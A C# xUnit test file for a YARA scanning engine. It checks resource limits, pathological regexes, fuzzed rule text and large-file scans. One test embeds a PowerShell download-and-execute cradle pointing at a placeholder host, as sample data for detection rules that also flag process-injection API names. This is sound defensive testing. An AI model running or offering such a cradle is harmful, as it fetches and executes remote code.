using System.Diagnostics;
using Blazma.Analysis.Yara;
using Xunit.Abstractions;

namespace Blazma.Analysis.Tests.Yara;

/// <summary>Hostile rules and hostile data: everything must stay bounded and never throw.</summary>
public class YaraSafetyTests(ITestOutputHelper output)
{
    [Fact]
    public void Huge_match_counts_saturate_at_the_cap_quickly()
    {
        var data = new byte[10 * 1024 * 1024];
        Array.Fill(data, (byte)'a');
        var sw = Stopwatch.StartNew();
        Assert.True(Y.Matches("$a = \"a\" $b = { 61 61 } $c = /a+/", $"#a == {YaraLimits.MaxHitsPerString} and #b == {YaraLimits.MaxHitsPerString} and #c == {YaraLimits.MaxHitsPerString}", data));
        Assert.False(Y.Matches("$a = \"a\"", "#a > 1000", data));
        Assert.True(Y.Matches("$a = \"a\"", "for all i in (1..#a) : ( @a[i] == i - 1 )", data));
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(10), $"took {sw.Elapsed}");
    }

    [Fact]
    public void Pathological_regexes_run_in_linear_time()
    {
        var data = new byte[2 * 1024 * 1024];
        Array.Fill(data, (byte)'a');
        var sw = Stopwatch.StartNew();
        Assert.False(Y.Matches("$a = /(a+)+b/", "$a", data));
        Assert.False(Y.Matches("$a = /(a|aa)*c/", "$a", data));
        Assert.False(Y.Matches("$a = /(a*)*[^a]/", "$a", data));
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(10), $"took {sw.Elapsed}");
    }

    [Fact]
    public void Pathological_hex_jumps_are_cut_off_by_the_time_budget()
    {
        var data = new byte[1024 * 1024];
        Array.Fill(data, (byte)'a');
        var set = Y.Rules("rule r { strings: $a = { 61 [0-4000] 61 [0-4000] 61 [0-4000] 62 } condition: $a }");
        var sw = Stopwatch.StartNew();
        var result = set.ScanDetailed(data, "sample");
        Assert.Empty(result.Matches);
        Assert.Contains(result.Warnings, w => w.Contains("$a", StringComparison.Ordinal) && w.Contains("time budget", StringComparison.Ordinal));
        Assert.True(sw.Elapsed < YaraLimits.StringSearchBudget + TimeSpan.FromSeconds(5), $"took {sw.Elapsed}");
    }

    [Fact]
    public void Loop_and_evaluation_budgets()
    {
        var set = Y.Rules("""
            rule too_wide { condition: for any i in (0..2000000) : ( i == 5 ) }
            rule too_many_steps { condition: for all i in (0..100000) : ( for all j in (0..1000) : ( true ) ) }
            rule fine { condition: for any i in (0..1000) : ( i == 999 ) }
            """);
        var result = set.ScanDetailed("x"u8, "sample");
        Assert.Equal(["fine"], result.Matches.Select(m => m.Rule));
        Assert.Contains(result.Warnings, w => w.Contains("too_wide", StringComparison.Ordinal) && w.Contains("exceeds the limit", StringComparison.Ordinal));
        Assert.Contains(result.Warnings, w => w.Contains("too_many_steps", StringComparison.Ordinal) && w.Contains("steps", StringComparison.Ordinal));
    }

    [Fact]
    public void Arithmetic_edge_cases_never_throw()
    {
        Assert.True(Y.Cond("-9223372036854775807 - 1 \\ -1 == 0 or true"));
        Assert.False(Y.Cond("(-9223372036854775807 - 1) \\ -1 == 0"));
        Assert.True(Y.Cond("9223372036854775807 + 1 < 0")); // wraps, like YARA's int64
        Assert.True(Y.Cond("1 << 64 == 0 and 1 << 63 < 0"));
        Assert.False(Y.Cond("1 << -1 == 0"));
        Assert.False(Y.Cond("uint32(9223372036854775807) == 0"));
        Assert.False(Y.Cond("uint32(-9223372036854775807) == 0"));
    }

    [Fact]
    public void Random_rule_text_never_throws()
    {
        var rnd = new Random(1234);
        const string alphabet = "rule{}():$#@!=\"/\\[]-?|~*.,0123456789abcdefxyzAZ \n\tmetastringsconditionandornotofforanyallthemin..at";
        var tokens = new[] { "rule ", "r", " { ", "}", "strings:", "condition:", "$a", " = ", "\"x\"", "{ 41 ?? }", "/a+/", " and ", " or ", "(", ")", "#a", "@a[1]", " of them", "for any i in (1..2) : ", "uint8(0)", " == ", "[1-2]", "xor", "wide", "\\" };
        for (var i = 0; i < 3000; i++)
        {
            var sb = new System.Text.StringBuilder();
            var useTokens = i % 2 == 0;
            var len = rnd.Next(1, 60);
            for (var k = 0; k < len; k++)
                sb.Append(useTokens ? tokens[rnd.Next(tokens.Length)] : alphabet[rnd.Next(alphabet.Length)]);
            var text = sb.ToString();
            var compiled = YaraCompiler.Compile(text, "fuzz.yar");
            // Whatever compiled must also scan without throwing.
            YaraRuleSet.FromCompilations([compiled]).ScanDetailed("Aaxx\0\x01"u8, "sample");
        }
    }

    [Fact]
    public void Scanning_50_MB_with_realistic_rules_is_fast()
    {
        var data = new byte[50 * 1024 * 1024];
        new Random(7).NextBytes(data);
        var pe = YaraRealisticRuleTests.FakePe(0x400, (0x178, "UPX0"), (0x1A0, "UPX1"));
        pe.CopyTo(data, 0);
        YaraRealisticRuleTests.FakePe(0x200).CopyTo(data, 30 * 1024 * 1024);
        var cradle = Y.Wide("powershell -c IEX (New-Object Net.WebClient).DownloadString('http://example.test')");
        cradle.CopyTo(data, 40 * 1024 * 1024);

        var extra = """
            rule Xor_Marker { strings: $a = "This program cannot be run in DOS mode" xor(1-255) condition: $a }
            rule Hex_Jumps { strings: $a = { E8 ?? ?? ?? ?? [4-32] C3 CC CC CC CC CC CC CC } condition: #a > 100000 }
            rule Many_Words { strings: $a = "VirtualAlloc" nocase wide ascii $b = "CreateRemoteThread" fullword $c = /https?:\/\/[a-z0-9.-]{4,64}\/[a-z]{3,}\.php/ condition: any of them }
            """;
        var set = Y.Rules(YaraRealisticRuleTests.Upx + YaraRealisticRuleTests.PowerShellCradle + YaraRealisticRuleTests.EmbeddedPe + extra);
        var sw = Stopwatch.StartNew();
        var result = set.ScanDetailed(data, "sample");
        sw.Stop();
        output.WriteLine($"50 MB scan with {set.RuleCount} rules: {sw.ElapsedMilliseconds} ms");
        output.WriteLine("matched: " + string.Join(", ", result.Matches.Select(m => m.Rule + "@" + string.Join("/", m.Strings.Select(s => s.Identifier + ":" + s.Offset)))));

        Assert.Empty(result.Warnings);
        Assert.Equal(["UPX_Packed", "PowerShell_Download_Cradle", "Embedded_PE"], result.Matches.Select(m => m.Rule));
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(20), $"took {sw.Elapsed}");
    }

    [Fact]
    public void Scanning_128_MB_works()
    {
        var data = new byte[128 * 1024 * 1024];
        "needle at the end"u8.CopyTo(data.AsSpan(data.Length - 17));
        var sw = Stopwatch.StartNew();
        var matches = Y.Scan("""
            rule tail { strings: $a = "needle" $b = { 6E 65 65 64 6C 65 [1-8] 74 68 65 } condition: $a at filesize - 17 and $b and uint8(filesize - 1) == 0x64 }
            """, data);
        output.WriteLine($"128 MB scan: {sw.ElapsedMilliseconds} ms");
        Assert.Single(matches);
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(20), $"took {sw.Elapsed}");
    }

    [Fact]
    public void Empty_data_is_fine()
    {
        Assert.True(Y.Matches("$a = \"x\" $b = /x/ $c = { 78 [1-2] 79 }", "not $a and not $b and not $c and filesize == 0 and not defined uint8(0)", []));
    }
}
